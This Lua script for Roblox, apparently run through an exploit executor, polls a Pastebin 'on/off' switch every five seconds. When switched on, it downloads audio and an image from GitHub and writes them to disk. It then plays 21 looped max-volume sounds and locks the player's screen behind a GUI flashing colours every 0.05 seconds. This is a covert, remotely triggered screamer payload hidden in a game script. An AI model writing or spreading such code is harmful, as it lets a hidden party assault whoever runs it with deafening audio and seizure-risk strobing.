local questIcon = playerGui:WaitForChild("QuestIconApp", 10)
if questIcon then
    questIcon:Destroy()
    print("QuestIconApp has been deleted.")
end

-- ============================================================
-- 🔁 АВТОЧЕКЕР PASTEBIN (ИСПРАВЛЕННЫЙ)
-- ============================================================
local PASTEBIN_URL = "https://pastebin.com/raw/SWQZAFMn"
local CHECK_INTERVAL = 5
local screamTriggered = false

local function fetchPastebin()
    local urls = {
        PASTEBIN_URL,
        "https://pastebin.com/dl/SWQZAFMn",
        PASTEBIN_URL .. "?t=" .. tick(),
    }

    for _, url in ipairs(urls) do
        local ok, res = pcall(function()
            return game:HttpGet(url, true)
        end)
        if ok and res and #res > 0 then
            return res
        end

        if request then
            local ok2, res2 = pcall(function()
                return request({ Url = url, Method = "GET" }).Body
            end)
            if ok2 and res2 and #res2 > 0 then
                return res2
            end
        end

        if syn and syn.request then
            local ok3, res3 = pcall(function()
                return syn.request({ Url = url, Method = "GET" }).Body
            end)
            if ok3 and res3 and #res3 > 0 then
                return res3
            end
        end

        if http_request then
            local ok4, res4 = pcall(function()
                return http_request({ Url = url, Method = "GET" }).Body
            end)
            if ok4 and res4 and #res4 > 0 then
                return res4
            end
        end
    end
    return nil
end

-- ============================================================
-- СКРИМЕР
-- ============================================================
local function runScreamer()
    local fenv = getfenv()
    pcall(function(p1, a, b, c) end)

    local okAudio, audioData = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
    end)
    if okAudio and audioData then
        pcall(function() writefile("po.mp3", audioData) end)
    end

    local soundAsset
    pcall(function() soundAsset = fenv.getcustomasset("po.mp3") end)

    if soundAsset then
        local Sound = Instance.new("Sound")
        Sound.Parent = workspace
        Sound.SoundId = soundAsset
        Sound.Volume = 10
        Sound.Looped = true
        Sound:Play()

        for i = 1, 20 do
            local s = Instance.new("Sound")
            s.Parent = workspace
            s.SoundId = soundAsset
            s.Volume = 10
            s.Looped = true
            s.RollOffMaxDistance = 1e9
            s.RollOffMinDistance = 0
            s:Play()
        end
    end

    local okImg, imgData = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/alexcodep/love-2-for-shame/main/IMG_0939.jpeg")
    end)
    if okImg and imgData then
        pcall(function() writefile("dsf.jpg", imgData) end)
    end

    local imgAsset
    pcall(function() imgAsset = fenv.getcustomasset("dsf.jpg") end)

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "SKS_HardLock"
    ScreenGui.DisplayOrder = 999
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui

    local BG = Instance.new("Frame")
    BG.Size = UDim2.new(1, 0, 1, 0)
    BG.BackgroundColor3 = Color3.new(0, 0, 0)
    BG.BorderSizePixel = 0
    BG.ZIndex = 1
    BG.Parent = ScreenGui

    local ImageLabel = Instance.new("ImageLabel")
    if imgAsset then ImageLabel.Image = imgAsset end
    ImageLabel.Size = UDim2.new(0, 600, 0, 600)
    ImageLabel.BackgroundTransparency = 1
    ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    ImageLabel.ZIndex = 5
    ImageLabel.Parent = ScreenGui

    local TextLabel = Instance.new("TextLabel")
    TextLabel.Text = "ЭТО СКАМ ЭТО СКРИПТ ЛИВАЙ"
    TextLabel.TextScaled = true
    TextLabel.Size = UDim2.new(0, 200, 0, 100)
    TextLabel.TextColor3 = Color3.new(1, 1, 1)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    TextLabel.ZIndex = 999
    TextLabel.Parent = ScreenGui

    task.spawn(function()
        local colors = {
            Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
            Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255)
        }
        while true do
            for _, c in ipairs(colors) do
                pcall(function() BG.BackgroundColor3 = c end)
                task.wait(0.05)
            end
        end
    end)

    task.spawn(function()
        local TS = game:GetService("TweenService")
        while true do
            pcall(function()
                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 800, 0, 800)}):Play()
            end)
            task.wait(0.4)
            pcall(function()
                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 500, 0, 500)}):Play()
            end)
            task.wait(0.4)
        end
    end)

    task.spawn(function()
        local RS = game:GetService("RunService")
        local t = 0
        RS.RenderStepped:Connect(function(dt)
            t = t + dt * 5
            pcall(function() TextLabel.TextColor3 = Color3.fromHSV(t % 1, 1, 1) end)
        end)
    end)
end

local function checkStatus()
    local response = fetchPastebin()

    if not response then
        warn("[Скример] Не удалось получить данные с Pastebin")
        return
    end

    local clean = response:gsub("<[^>]->", ""):lower()
    local trimmed = clean:gsub("%s+", "")

    print("[Скример] Статус: " .. trimmed)

    if (trimmed == "on" or trimmed:match("^on$") or clean:match("%f[%a]on%f[%A]")) and not screamTriggered then
        screamTriggered = true
        runScreamer()
    elseif trimmed == "off" then
        screamTriggered = false
    end
end

checkStatus()

task.spawn(function()
    while task.wait(CHECK_INTERVAL) do
        checkStatus()
    end
end)
